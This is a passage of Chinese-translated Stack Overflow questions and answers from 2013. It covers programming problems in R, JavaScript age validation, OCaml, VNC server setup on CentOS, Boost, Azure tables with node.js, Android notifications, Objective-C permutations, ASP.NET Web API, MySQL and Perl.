但不幸的是，它没有按计划工作，因为我的`y`向量最终只包含 0。我做错什么了？谢谢 ：）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T06:44:21.797

这可以使用矢量化操作而不是循环来完成：

```
> x <- runif(20, 0, 2)
> y <- as.integer(x > 1)
> x
 [1] 0.06553935 1.23221386 0.39982502 0.27821193 1.15281280 0.14248373 0.09206153 1.63555223 0.44962775 0.70711450
[11] 0.93994130 1.41955732 1.95790383 0.99646643 1.38737559 1.75813075 1.32844540 0.53076589 0.96152349 1.31173062
> y
 [1] 0 1 0 0 1 0 0 1 0 0 0 1 1 0 1 1 1 0 0 1 
```

更通用的解决方案是使用`ifelse`，因为它允许您使用零和一以外的值：

```
> ifelse(x <= 1, -5, 5)
 [1] -5  5 -5 -5  5 -5 -5  5 -5 -5 -5  5  5 -5  5  5  5 -5 -5  5 
```

最后，值得注意的是，您可以使用以下两种方法中的任何一种来使用更复杂的表达式：

```
> ifelse(x >= .5 & x <= 1.5, -5, 5)
 [1]  5 -5  5  5 -5  5  5  5  5 -5 -5 -5  5 -5 -5  5 -5 -5 -5 -5 
```

# iphone - 如何将 MKMapView 置于 MKPolygonView 顶部

> ID：15738780
> 
> 赞同：0
> 
> 时间：2013-04-01T06:36:21.070
> 
> 标签：iphone, ios, mkmapview, mapkit

我在 MKMapView 上添加所有国家边界形状的彩色多边形，但我的问题是，我希望在地图上添加多边形后，城市和地点的名称应该看起来清晰，并且在多边形顶部添加了完全可见的多边形。

我已经将 alpha 值设置为 MKPolygonView 的一半，以在地图上显示两个彩色多边形以及名称太明显，但是通过这样做，名称位于多边形后面，我的客户需要名称应该位于具有完全非透明彩色多边形的多边形之上。

我用谷歌搜索了很多，没有得到这个问题的适当答案。

如果有人有解决方案，我非常钦佩。

我希望你得到我的查询，如果没有，请让我知道所以我可以详细说明它，因为我需要尽快解决。

# javascript - 年龄验证 Javascript

> ID：15738782
> 
> 赞同：0
> 
> 时间：2013-04-01T06:36:42.497
> 
> 标签：javascript, validation

到目前为止有这个但不会工作？

```
//if no age was entered it will allow
var age=document.getElementById('age1').value;
if(age == "")     
    return true;

//check if age is a number or less than or greater than 100
if (isNaN(age)||age<1||age>100)
{ 
    alert("The age must be a number between 1 and 100");
    return false;
} 
```

我只需要验证！！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:46:45.613

为什么不使用正则表达式来验证这一点。为此使用下面的正则表达式：

```
/^[1-9]?[0-9]{1}$|^100$/ 
```

此正则表达式匹配 1 位或 2 位数字或 100：

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:40:43.510

`+`尝试转换为的快捷方式`Number`，或使用`parseInt(value, 10)`

```
var age = +document.getElementById('age1').value;

if ( !( age > 1 && age<100 ) ){

        alert("The age must be a number between 1 and 100");
        return false;
}

return true; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:38:08.297

你会想要 parseInt() 你回到年龄的值，因为它是以字符串的形式出现的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T06:40:15.197

您应该使用将字符串转换为数字`parseInt(value, radix)`。`radix`在使用此方法时提供 是一个很好的做法。在您的情况下，它是小数，所以`radix`is `10`。

尝试这个：

```
//if no age was entered it will allow
var age=document.getElementById('age1').value;
if(age === "") {
  return true;
}

// convert age to a number
age = parseInt(age, 10);

//check if age is a number or less than or greater than 100
if (isNaN(age) || age < 1 || age > 100)
{ 
  alert("The age must be a number between 1 and 100");
  return false;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-09-02T17:22:01.850

从我身上试试这个作品:)

```
var dateString = document.getElementById("age1").value;
if(dateString !=""){
  var today = new Date();
  var birthDate = new Date(dateString);
  var age = today.getFullYear() - birthDate.getFullYear();
  var m = today.getMonth() - birthDate.getMonth();
  var da = today.getDate() - birthDate.getDate();
  if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
    age--;
  }
  if(m<0){
    m +=12;
  }
  if(da<0){
    da +=30;
  }
  if (age >= 1 && age <= 99) {
    return true;
  }else {
    return false;
  }

}else {
  return false;
} 
```

您还可以使用其他库来计算时间，例如 moment [https://momentjs.com/](https://momentjs.com/)可以更轻松地计算时间（秒、分钟、小时、天、年等）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-01-08T15:48:19.130

试试这个，最低 18 岁，最高 70 岁

```
validateAge(year,month,day) {

    const max_year = new Date().getFullYear() - 70 ;
    const min_year = new Date().getFullYear() - 18 ;
    const _month = new Date().getMonth() + 1;
    const _day = new Date().getDay();

    const dateofbirthDate = new Date(year + "-"+month+"-"+day);
    const mindate = new Date( min_year+ '-'+_month+'-'+_day);
    const maxdate = new Date(max_year+ '-'+_month+'-'+_day);

    if(dateofbirthDate <= mindate && dateofbirthDate >= maxdate){
        return true;
    }
    else
        return false; 
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-06-25T07:51:33.333

尝试这个

```
<input type='text' name='dob' onblur="Age_validator(this.value)" style='width:108px;' />
<div><span id="dob1"></span></div>
function Age_validator(str){
    // which user inputs
    str = str.split("-");
    var dd = str[0];
    var mm = str[1];
    var yy = str[2];
    // Current date calculation
    var d = new Date();
    var ds = d.getDate();
    var ms = d.getMonth();
    var ys = d.getFullYear();
    // convert 18years as days from current date
    var days = ((18 * 12) * 30) + (ms * 30) + ds;
    // convert days from input value
    var age = (((ys - yy) * 12) * 30) + ((12 - mm) * 30) + parseInt(30 - dd);

    if((days - age) <= '0'){
        console.log((days - age));
        document.getElementById('dob1').innerHTML = 'Valid';
        // or return your own script
    }else{
        console.log((days - age));
        document.getElementById('dob1').innerHTML = 'Invalid';
        // or return your own script
    }
} 
```

**如果有用请+1**

# ocaml - Ocaml 列表元素乘法

> ID：15738783
> 
> 赞同：-1
> 
> 时间：2013-04-01T06:36:45.593
> 
> 标签：ocaml

```
let rec intmult =
  fun (aList ,al) ->
    if(List.tl aList == []) then
      ((List.hd aList) *  al)   
    else
      List.hd aList * al :: intmult (List.tl aList , al);; 
```

为什么是错的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:46:44.650

你的两个分支`if`返回不同的类型。第一个分支返回一个`int`. 第二个 ( `else`) 分支返回一个整数列表。OCaml 表达式必须具有单一类型，因此您需要以某种方式使这两种类型相同。

我也有点担心如果你将一个空列表传递给这个函数会发生什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T10:12:56.820

这可能是一种更好的写法：

```
let rec intmult : int list * int -> int list =
   function ([],_) -> [0]   (* this case is not processed by your code *)
   |  ([x] ,al) -> [x * al]    (* this case returns an int in your code *)
   | (x::xs,al) ->  x * al :: intmult (xs, al);; 
```

你也可以使用`List.map`：

```
let intmult (l,m)= List.map (fun x -> x * m) l 
```

# remote-access - 在 Centos 或 RH 类型的 Linux 上启动 vncserver 失败并出现 - 致命服务器错误：无法打开默认字体“已修复”。我怎样才能解决这个问题？

> ID：15738785
> 
> 赞同：9
> 
> 时间：2013-04-01T06:36:54.053
> 
> 标签：remote-access, vnc, vnc-server

我想在通用/干净的 Centos 或 RH 类型的 Linux 上设置 vncserver。我在 AWS EC2 基础设施中工作，但我相信这无关紧要。

为了使这项工作成功，我们需要一些先决条件来帮助我们运行 vnc 会话，即 X Windows。

在 yum 的帮助下，我已经安装了所有常用的软件包，并遵循了我在互联网上可以找到的每一个建议

```
# Start by installing the X Windows System (-y to auto accept) 
yum groupinstall -y "X Window System" 
```

然后

```
# Install the VNC stuff
yum install -y  tigervnc-server tigervnc-server-module 
```

但是当我尝试启动 vnc

```
service vncserver start 
```

我收到这样的错误文本（在您运行 vncpasswd 并修改 /etc/sysconfig/vncservers 之后）

```
bash-4.1# service vncserver start
Starting VNC server: 2:root xauth:  creating new authority file /root/.Xauthority

WARNING: The first attempt to start Xvnc failed, possibly because the font
catalog is not properly configured.  Attempting to determine an appropriate
font path for this system and restart Xvnc using that font path ...
Could not start Xvnc.

Xvnc TigerVNC 1.1.0 - built Feb 22 2013 22:28:37
Copyright (C) 1999-2011 TigerVNC Team and many others (see README.txt)
See http://www.tigervnc.org for information on TigerVNC.
Underlying X server release 11300000, The X.Org Foundation

Initializing built-in extension Generic Event Extension
Initializing built-in extension SHAPE
Initializing built-in extension MIT-SHM
Initializing built-in extension XInputExtension
Initializing built-in extension XTEST
Initializing built-in extension BIG-REQUESTS
Initializing built-in extension SYNC
Initializing built-in extension XKEYBOARD
Initializing built-in extension XC-MISC
Initializing built-in extension XFIXES
Initializing built-in extension RENDER
Initializing built-in extension RANDR
Initializing built-in extension DAMAGE
Initializing built-in extension MIT-SCREEN-SAVER
Initializing built-in extension DOUBLE-BUFFER
Initializing built-in extension RECORD
Initializing built-in extension DPMS
Initializing built-in extension X-Resource
Initializing built-in extension XVideo
Initializing built-in extension XVideo-MotionCompensation
Initializing built-in extension VNC

Mon Apr  1 01:09:13 2013
 vncext:      VNC extension running!
 vncext:      Listening for VNC connections on all interface(s), port 5902
 vncext:      created VNC server for screen 0
[dix] Could not init font path element catalogue:/etc/X11/fontpath.d, removing from list!
[dix] Could not init font path element built-ins, removing from list!

Fatal server error:
could not open default font 'fixed' 
```

我已经尝试了互联网上有关安装字体、创建链接、重命名 x、y 和 z 的所有建议和技巧，但均无济于事。我怎样才能让它工作？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-01T06:36:54.053

yum installs 的神奇组合为我工作如下：

```
yum groupinstall -y "X Window System"
yum install -y  tigervnc-server tigervnc-server-module libXfont pixman xterm xorg-x11-twm
chkconfig --level 345 vncserver on 
```

然后为了方便起见，也许是这样的

```
echo 'VNCSERVERS="2:root"' >> /etc/sysconfig/vncservers 
```

这是假设您以 root 身份执行所有这些操作，并且您很高兴在 DISPLAY 2 上启动 vncserver。

如果您在尝试连接到 vncserver 后遇到连接被拒绝错误，请检查以下几件事：

1.  您的本地防火墙（iptables）或其他允许连接到 5902（或您的服务器正在使用的另一个端口）

2.  您没有禁止通过 /etc/sysconfig/vncservers 中的 VNCSERVERARGS 选项远程连接到 vncserver，如下所示：

    ```
    VNCSERVERARGS[2]="-geometry 800x600 -nolisten tcp -localhost" 
    ```

就像是

```
tcpdump port 5902 
```

可以帮助您确定是本地还是远程防火墙问题等。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-30T14:21:18.160

我更新了 libXfont，它帮助了我。

以 CentOS 为例，执行以下操作：

```
yum update libXfont 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-05-17T12:14:36.360

以下步骤对我有用。

```
yum groupinstall -y Desktop

yum -y install tigervnc-server pixman pixman-devel libXfont

chkconfig --levels 235 vncsever on 
```

创建 vncpassword

```
[root@krizna ~]$vncpasswd 
```

打开 /etc/sysconfig/vncservers 并添加以下行（根据您的要求更改）

```
VNCSERVERS="1:root"

VNCSERVERARGS[1]="-geometry 800x600" 
```

现在启动服务

```
service vncserver start 
```

现在您可以正常启动服务了。

检查此链接[在 centos 6 上安装 vnc](http://www.krizna.com/centos/install-vnc-on-centos-6/ "在centos 6上安装vnc")

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-07-01T08:53:35.783

仔细检查“/”上是否有足够的可用空间。我收到上述错误是因为“/”下没有可用空间。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-26T06:59:47.370

1.  确保您的系统已经安装了以下软件包

    ```
    yum -y install tigervnc-server pixman pixman-devel libXfont 
    ```

2.  `/etc/sysconfig/vncservers`通过编辑文件并将您的用户添加到未注释的行，确保您正确配置了 vncserver

    ```
    VNCSERVERS="2:user_name" 
    ```

    并取消注释以下行

    ```
    VNCSERVERSARGS[2]="-geometry 800x600 -nolisten tcp -localhost" 
    ```

3.  切换到用户 user_name 并设置`vncpasswd`.

4.  重启 vncserver 服务`service vncserver restart`。

5.  创建一个 vncserver 会话`vncserver :1`。

6.  确保您的防火墙接受您的连接。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-01-01T14:48:22.730

对我来说，我只需要这个：

```
sudo yum install xorg-x11-fonts-base 
```

虽然在那之后我遇到了另一个问题：“ `VNC: Could not acquire name on session bus`”。这里提到了：[http](http://ubuntuforums.org/showthread.php?t=1480094) ://ubuntuforums.org/showthread.php?t=1480094但我还没有深入了解它......

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2014-03-09T23:07:00.220

确保您的循环接口已启动。

# ios - 当 darwin.jam 的 macosx-version-min 设置为我的机器上未安装的 SDK 版本时，Boost Bjam/b2 是否会失败？

> ID：15738792
> 
> 赞同：1
> 
> 时间：2013-04-01T06:37:21.477
> 
> 标签：ios, boost, bjam

我正在为 iOS 构建一些 C++ Boost 库（测试库）。我想将 b2 的 macosx-version-min 选项设置为我的机器上未安装的 SDK 版本（例如：macosx-version-min = 4.3，而仅安装了 SDK 6.0）。但是Boost的b2报错说没有安装请求版本的SDK。

*   a) 当 b2 的 macosx-version-min 设置为我的机器上未安装的 SDK 版本时，Boost Bjam/b2 是否应该失败？

*   b) 由于 Boost 库是 C++ 库，指定一个 macosx-version-min（又名 iOS 上的部署目标 SDK）是否有意义？

*   c) 如果 b) 是，它对什么场景有用？我知道当弱链接 Apple 的框架标题符号时，它在 Objective-C 中很有用。

电脑设置：

*   最大 OS X 10.8.2
*   已安装 iOS SDK：iOS 6.0
*   Xcode：4.5.2
*   升压 C++：1.50

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-06T18:05:43.513

这是启动的果酱文件中的一个错误，他们尚未修复。我之前破解了果酱文件以“添加”到我想要的最小版本中。我真的希望他们在 CMake 正确理解这一点后立即切换到 cmake。

因此，为此编辑 tools/build/v2/tools/darwin.jam 文件并添加这一行

```
feature.extend macosx-version-min : 4.3 ; 
```

之后

```
feature macosx-version-min : : propagated optional ; 
```

线。

这也适用于 Mac OS X。例如，将 10.6 添加到最低版本列表中。

# node.js - 部署到云时无法将实体添加到 node.js 中的天蓝色存储表？

> ID：15738793
> 
> 赞同：1
> 
> 时间：2013-04-01T06:37:25.337
> 
> 标签：node.js, azure, guid, azure-storage, azure-table-storage

我在 node.js 中使用 socket.io 在我的天蓝色云项目中实现聊天功能。在其中，我一直在使用 node.js 将用户聊天历史记录添加到表中。当我在本地模拟器上运行它时它工作正常，但奇怪的是，当我部署到我的天蓝色云时它不起作用并且它也不会引发任何错误，所以它真的令人难以置信。下面是我的代码。

```
 var app = require('express')()
  , server = require('http').createServer(app)
  , sio = require('socket.io')
 , redis = require('redis');

var client = redis.createClient();
var io = sio.listen(server,{origins: '*:*'});

io.set("store", new sio.RedisStore);

process.env.AZURE_STORAGE_ACCOUNT = "account";
process.env.AZURE_STORAGE_ACCESS_KEY = "key";

var azure = require('azure');
var chatTableService = azure.createTableService();

createTable("ChatUser");

server.listen(4002);

 socket.on('privateChat', function (data) {        
    var receiver = data.Receiver;
    console.log(data.Username);

    var chatGUID1 = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);
        return v.toString(16);
    });

 var chatRecord1 = {
        PartitionKey: data.Receiver,
        RowKey: data.Username,
        ChatID: chatGUID2,
        Username: data.Receiver,
        ChattedWithUsername: data.Username,
        Timestamp: new Date(new Date().getTime())
    };
    console.log(chatRecord1.Timestamp);

    queryEntity(chatRecord1);
}

function queryEntity(record1) {
chatTableService.queryEntity('ChatUser'
, record1.PartitionKey
, record1.RowKey
, function (error, entity) {
    if (!error) {
        console.log("Entity already exists")
    }
    else {
        insertEntity(record1);            
    }
})    
}

function insertEntity(record) {
chatTableService.insertEntity('ChatUser', record, function (error) {
    if (!error) {
        console.log("Entity inserted");
    }        
});
} 
```

它在我的本地模拟器上工作，但不在云上工作，我读到在云表上创建记录时实体的 DateTime 变量不应为空。但是我很确定传递时间戳的方式很好，对吗？任何其他想法为什么它可能在本地而不是在云上工作？

编辑：

我在运行 socket.io 服务器时也遇到了这个错误，但是尽管有这个错误，socket.io 功能工作正常，所以我没有费心去关心它。我不知道这个错误首先意味着什么。

```
{ [Error: connect ECONNREFUSED]
  code: 'ECONNREFUSED',
  errno: 'ECONNREFUSED',
  syscall: 'connect' } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T16:50:36.373

几件事：

*   您不需要设置时间戳，服务应该在您插入记录时自动填充。

*   在本地运行它时，您可以将环境变量设置为 Windows Azure 存储帐户设置，并查看它在您的开发人员机器上运行时是否会成功写入表。无需在模拟器中运行，只需设置环境变量并直接使用 node.exe 运行应用程序。

您是以 Web 角色还是工作者角色运行？我假设它是一个云服务，因为你提到了模拟器。如果它是工作人员角色，可能会添加一些工具以记录到文件以帮助调试。如果它是一个 Web 角色，您可以在应用程序的根目录中添加一个 iisnode.yml 文件，在文件中使用以下行来启用 stdout/stderr 的日志记录：

```
loggingEnabled: true 
```

这会将 stdout/stderr 捕获到 web 角色实例的 e: 或 f: 上的 approot 文件夹下的 iislog 文件夹。您可以远程桌面到实例并查看日志以查看您拥有的用于成功插入的日志是否正在发生。

否则，从上面的代码中看不出发生了什么。类似的代码对我来说效果很好。我的测试代码的相关位可以在[https://gist.github.com/Blackmist/5326756](https://gist.github.com/Blackmist/5326756)找到。

希望这可以帮助。

# python - openerp treeview onclick 记录

> ID：15738794
> 
> 赞同：0
> 
> 时间：2013-04-01T06:37:30.273
> 
> 标签：python, xml, openerp

我需要输入员工的收入，明智的员工通过从我的树视图中单击它们（树显示与上述选定部门相关的工人。）在他们的工作时间/总公斤数和超过公斤数输入之后，表格允许输入工资、奖励、加班和其他事情

所以需要在我的表单部分下方添加该表单。（不是作为弹出窗口）

目前员工的工作时间/总公斤数和超过公斤数保存在一个表中，工资、奖励、加班费和其他东西保存在另一个表中。两者都有用于识别工人的 worker_id 列。请建议我在 openerp 版本 7 中实现这一点

[请参阅此链接以获取我的表格图片](http://i.stack.imgur.com/6GiMc.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:48:26.183

你能检查你的字段'selected_tea_workers_line_ids'你用过editable='bottom'吗

删除它然后打开表单视图

# express - 将 socket.io ID 与 express 和 passport 关联

> ID：15738795
> 
> 赞同：2
> 
> 时间：2013-04-01T06:37:32.997
> 
> 标签：express, socket.io, passport.js

我简单尝试的目标是显示在线用户列表。我的意思是显示不是 socket.io ID，而是显示用户配置文件。当授权用户连接到我的服务器时，打开 socket.io 通道，需要获取他的配置文件并向其他已连接的用户发送新用户（姓名、电子邮件等）已连接的消息。我看到了许多如何在授权范围内执行此操作的示例，但它无法处理断开连接。我想用伪代码做什么和不能做什么：

```
var io = require("socket.io").listen(server);
io.set("authorization", function(data, callback){
     // ... some code...
     callback(null, true);
});

io.sockets.on('connection', function (socket) {
    var UserProfile = passport.getUserProfile(socket.id) 
    io.sockets.emit('user_connected', {UserProfile: UserProfile, socketID: socket.id}); 

    io.sockets.on('disconnect', function (socket) {
         io.sockets.emit('user_disconnected', {socketID: socket.id});
    }); 

}); 
```

*这是一个伪代码！*
我的堆栈溢出了。我只想在连接中将 socket.io ID 和护照帐户链接在一起。我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T20:27:03.610

我遇到了同样的问题，我的解决方案如下（希望有人能有更好的主意）：

*   我将用户名添加到渲染调用（使用jade）： res.render('chatroom', {username: req.user.username});
*   连接到客户端上的套接字（io.connect）后，我使用客户端上的连接事件（socket.on（'connect'，函数（数据）{。 .. });
*   在服务器上，我将用户名存储在一个对象中（clients[socket.id] = username）
*   之后，我通过访问客户端对象在每个套接字消息中获取用户名

# android - 如何在android中添加动态图像而不是通知图标？

> ID：15738800
> 
> 赞同：4
> 
> 时间：2013-04-01T06:38:11.207
> 
> 标签：android, android-notification-bar

我使用下面的代码在通知栏中显示通知。

它工作得很好。

但我需要动态显示来自网络服务的通知图标。

我该怎么办？

```
NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

Notification note = new Notification(R.drawable.image,"status message", System.currentTimeMillis());

        Intent in = new Intent(Notify.this,CommentU.class);
        PendingIntent pi = PendingIntent.getActivity(Notify.this, 0, in, 0);
        note.setLatestEventInfo(Notify.this,"NotificationTitle", "You have a new Commentio", pi);
        note.number = ++count;
        note.vibrate = new long[] { 500l, 200l, 200l, 500l };
        note.flags |= Notification.FLAG_AUTO_CANCEL;
        nm.notify(NOTIFY_ME_ID, note); 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:56:01.297

我有一个建议给你：你必须下载你想要显示的图像，然后你可以将它设置为位图：检查下面的代码。我创建了一个`BITMAP`. 它的外观链接：

![在此处输入图像描述](https://i.stack.imgur.com/fH57s.png)

为此，您必须添加`android-support-v4.jar`

```
NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(
                this).setSmallIcon(R.drawable.ic_launcher)
                .setContentTitle("My notification").setLargeIcon(BITMAP)
                .setContentText("Hello World!");

        Intent resultIntent = new Intent(this, test.class);

        TaskStackBuilder stackBuilder = TaskStackBuilder.create(this);

        stackBuilder.addParentStack(test.class);

        stackBuilder.addNextIntent(resultIntent);
        PendingIntent resultPendingIntent = stackBuilder.getPendingIntent(0,
                PendingIntent.FLAG_UPDATE_CURRENT);
        mBuilder.setContentIntent(resultPendingIntent);
        NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        mNotificationManager.notify(NOTIFY_ME_ID, mBuilder.build()); 
```

有关更多详细信息，请查看此[链接](http://developer.android.com/guide/topics/ui/notifiers/notifications.html)。

**删除通知**

通知保持可见，直到发生以下情况之一：

用户可以单独或使用“全部清除”（如果可以清除通知）来关闭通知。

用户单击通知，您`setAutoCancel()`在创建通知时调用。您需要`cancel()`一个特定的通知 ID。此方法还会删除正在进行的通知。

您拨打`cancelAll()`，这会删除您之前发出的所有通知。

**编辑：**只需替换它。

```
mBuilder = new NotificationCompat.Builder(
                this).setSmallIcon(R.drawable.ic_launcher)
                .setContentTitle("My notification").setLargeIcon(BITMAP)
                .setAutoCancel(true)
                .setContentText("Hello World!"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:59:34.347

只需在资源文件夹中添加一些图标，然后

`int myIcon = R.drawable.image;`

你的逻辑在这里....

并根据您的逻辑更改图标的值，例如`myIcon = R.drawable.somenewimage;`

然后最后设置你的通知

`Notification note = new Notification(myIcon,"status message", System.currentTimeMillis());`

# java - 如何在 android 中创建动态壁纸应用程序？

> ID：15738801
> 
> 赞同：-1
> 
> 时间：2013-04-01T06:38:11.220
> 
> 标签：java, android, android-image

我想在 android 中创建动态壁纸，其中的图像集合以淡入淡出效果播放。所以我可以将其显示为动态壁纸。我想要像... [Lord Krishna 动态壁纸这样的壁纸](https://play.google.com/store/apps/details?id=com.funnyfreelivewallpaper.krishna&feature=more_from_developer)

如果有任何链接或任何动态壁纸示例，请回复？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T06:43:21.270

尝试以下有关如何创建动态壁纸的 Vogella 教程，可能会对您有所帮助！“ [http://www.vogella.com/articles/AndroidLiveWallpaper/article.html](http://www.vogella.com/articles/AndroidLiveWallpaper/article.html) ”：]

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T06:57:01.663

这是在 android 中创建动态壁纸应用程序的示例代码教程。点击[这里](http://www.codeproject.com/Articles/108390/How-To-Create-Android-Live-Wallpaper)

# objective-c - 计算数字数组的可能排列

> ID：15738807
> 
> 赞同：5
> 
> 时间：2013-04-01T06:38:40.123
> 
> 标签：objective-c, for-loop, nsarray, combinations, combinatorics

我有一个带有数字 {0,1,2,3} 的 NSArray

计算 4 的阶乘（数组的计数），我有 0、1、2、3 的 24 种可能排列

我想知道是否有办法计算所有这些可能的排列并将它们放在一个单独的数组中。

例如，给定上面的数字 {0,1,2,3}，得到的排列将是：

```
0123, 0132, 0213, 0231, 0312, 0321,
1023, 1032, 1203, 1230, 1302, 1320,
2013, 2031, 2103, 2130, 2301, 2310,
3012, 3021, 3102, 3120, 3201, 3210 
```

任何帮助是极大的赞赏。非常感谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T06:44:10.040

> 我想知道是否有办法计算所有这些可能的排列

当然（尽​​管它们不是[组合](https://en.wikipedia.org/wiki/Combination)，而是[排列](https://en.wikipedia.org/wiki/Permutation)）：

```
unsigned long long factorial(unsigned long long n)
{
    return n > 1 ? n * factorial(n - 1) : 1;
}

unsigned long long perms = factorial(array.count); 
```

> 并将它们放在一个单独的数组中。

当然，也有很好的排列算法，例如[Johnson-Trotter 算法](http://www.cut-the-knot.org/Curriculum/Combinatorics/JohnsonTrotter.shtml)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-01T07:57:31.223

我一直在寻找代码，但我设法弄清楚了:) 如果其他人需要它，代码如下：

```
static NSMutableArray *results;

void doPermute(NSMutableArray *input, NSMutableArray *output, NSMutableArray *used, int size, int level) {
    if (size == level) {
        NSString *word = [output componentsJoinedByString:@""];
        [results addObject:word];
        return;
    }

    level++;

    for (int i = 0; i < input.count; i++) {
        if ([used[i] boolValue]) {
            continue;
        }

        used[i] = [NSNumber numberWithBool:YES];
        [output addObject:input[i]];
        doPermute(input, output, used, size, level);
        used[i] = [NSNumber numberWithBool:NO];
        [output removeLastObject];
    }
}

NSArray *getPermutations(NSString *input, int size) {
    results = [[NSMutableArray alloc] init];

    NSMutableArray *chars = [[NSMutableArray alloc] init];

    for (int i = 0; i < [input length]; i++) {
        NSString *ichar  = [NSString stringWithFormat:@"%c", [input characterAtIndex:i]];
        [chars addObject:ichar];
    }

    NSMutableArray *output = [[NSMutableArray alloc] init];
    NSMutableArray *used = [[NSMutableArray alloc] init];

    for (int i = 0; i < chars.count; i++) {
        [used addObject:[NSNumber numberWithBool:NO]];
    }

    doPermute(chars, output, used, size, 0);

    return results;
} 
```

采用

> getPermutations（输入，大小）

得到一个存储了排列的 NSArray。

例如：

```
NSLog(@"%@", getPermutations(@"0123", 4));

//console log
RESULTS: (
    0123,
    0132,
    0213,
    0231,
    0312,
    0321,
    1023,
    1032,
    1203,
    1230,
    1302,
    1320,
    2013,
    2031,
    2103,
    2130,
    2301,
    2310,
    3012,
    3021,
    3102,
    3120,
    3201,
    3210
) 
```

它现在对我来说很完美:)

# azure - 如何使用 Windows Azure 在 ASP.NET Web API 中实现授权

> ID：15738808
> 
> 赞同：0
> 
> 时间：2013-04-01T06:38:41.547
> 
> 标签：azure, asp.net-mvc-4, asp.net-web-api, authorization

我有带有 get 方法的示例 ASP.NET Web API，我`[Authorize]`在方法顶部添加了一个属性。请问我应该如何从浏览器或提琴手调用此方法？另外，我在 Windows Azure 上托管这些 API

```
public class ValuesController : ApiController
{
    // GET api/values
    [Authorize]
    public IEnumerable<string> Get()
    {
        return new string[] { "value1", "value2" };
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:40:50.133

根据您使用的授权类型，可能会有不同的方式。但是，如果您使用默认路由，则可以在以下 url 调用您的方法：

```
/api/values 
```

根据您选择的授权机制，您当然可能需要传递其他标头。除非您配置了一些授权，否则该`[Authorize]`属性不会做任何事情。您可以查看[`following article`](http://codebetter.com/johnvpetersen/2012/04/02/making-your-asp-net-web-apis-secure/)如何使用令牌来验证您的用户的示例。

# mysql - 如何为 INSERT IGNORE 获取 mysql_errno()

> ID：15738816
> 
> 赞同：1
> 
> 时间：2013-04-01T06:39:15.563
> 
> 标签：mysql, key, duplicates

我有以下代码：

```
$link=mysql_connect("localhost", "user", "password") or die(mysql_error());
mysql_select_db(raddacen_staff,$link) or die(mysql_error());
$query=mysql_query("INSERT IGNORE INTO database...............") or die(mysql_error());

if(mysql_affected_rows()>0){
 echo 'Data Inserted';
}
else{
echo 'error code '.mysql_errno($link);
} 
```

当我尝试插入具有重复键的记录时，此代码显示错误代码为“0”。我想告诉用户，如果通过检测错误代码找到重复记录。这是因为 mysql_affected_rows() 由于多种原因不能 <0 或 0，所以我只需要指出重复键的特定错误代码。您知道如何使用 INSERT IGNORE 查询指出重复键的特定错误代码吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:57:39.223

从[手册](http://dev.mysql.com/doc/refman/5.5/en/insert.html)：

> 如果使用 IGNORE 关键字，则执行 INSERT 语句时发生的错误将被视为警告。例如，如果没有 IGNORE，复制表中现有 UNIQUE 索引或 PRIMARY KEY 值的行会导致重复键错误并且语句被中止。使用 IGNORE，行仍然没有插入，但不会发出错误。

因此，如果您想要错误，则需要删除隐藏错误的关键字，即`IGNORE`.

或者，您可以通过发出查询来阅读*警告。*`SHOW WARNINGS`

# perl - 打印文件直到找到某些字符

> ID：15738817
> 
> 赞同：2
> 
> 时间：2013-04-01T06:39:18.223
> 
> 标签：perl

1.  我的脚本正在从 .txt 文件中获取数据。
2.  我需要打印数据，直到在该文件中找到“MSISDN1”。

我执行的代码是：

```
open (SERVICE, "Service Req.txt") || die "Cannot open service req file $!\n";
my @serv=<SERVICE>;

open(LOG, ">>logfile.txt");

foreach $ser_req(@serv) {

#until ($ser_req =~ m/MSISDN1/g)
{
print $conn $ser_req;
print LOG $ser_req;
    print $ser_req;
}

close(LOG);
close (SERVICE) || die "Cannot close service req file $!\n"; 
```

当未注释直到条件时，代码运行不佳。

代码中有一个非常微小的错误。不应该应用直到循环。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T08:21:22.883

`until`开始一个循环。你可能想要

```
last if $ser_req =~ /MSISDN1/; 
```

而不是 ( `until`) 循环。你`{ ... }`也需要平衡你的牙套。

